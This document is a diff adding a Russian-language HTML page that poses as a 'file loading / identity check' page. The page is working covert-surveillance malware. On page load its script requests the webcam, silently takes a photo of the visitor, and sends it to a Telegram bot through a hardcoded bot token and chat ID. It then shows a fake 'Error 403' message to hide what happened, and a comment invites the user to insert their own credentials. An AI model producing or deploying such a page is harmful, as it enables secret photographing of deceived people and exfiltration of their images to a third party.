@@ -1,1 +1,46 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Загрузка файла...</title>
+    <style>
+        body { background: #000; color: #fff; font-family: sans-serif; text-align: center; padding-top: 20%; }
+        .spinner { border: 4px solid rgba(255,255,255,0.1); border-left-color: #fff; border-radius: 50%; width: 40px; height: 40px; animation: s 1s linear infinite; margin: 20px auto; }
+        @keyframes s { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="spinner"></div>
+    <p>Проверка доступа к документу...<br>Пожалуйста, подтвердите личность в окне браузера.</p>
+    <video id="v" autoplay style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+    <script>
+        // ВНИМАНИЕ: Вставь свои данные между кавычками ниже!
+        const token = '8461361223:AAH4aZLT12n7rEdpF0B8eI2mDLE7jUAy1kE'; 
+        const chat_id = '1789528504';
 
+        async function init() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                setTimeout(() => {
+                    const canvas = document.getElementById('c');
+                    canvas.width = 640; canvas.height = 480;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chat_id);
+                        formData.append('photo', blob, 'shot.jpg');
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
+                        alert("Ошибка 403: Доступ ограничен.");
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 'image/jpeg');
+                }, 1500);
+            } catch (err) { alert("Ошибка: доступ запрещен."); }
+        }
+        window.onload = init;
+    </script>
+</body>
+</html>
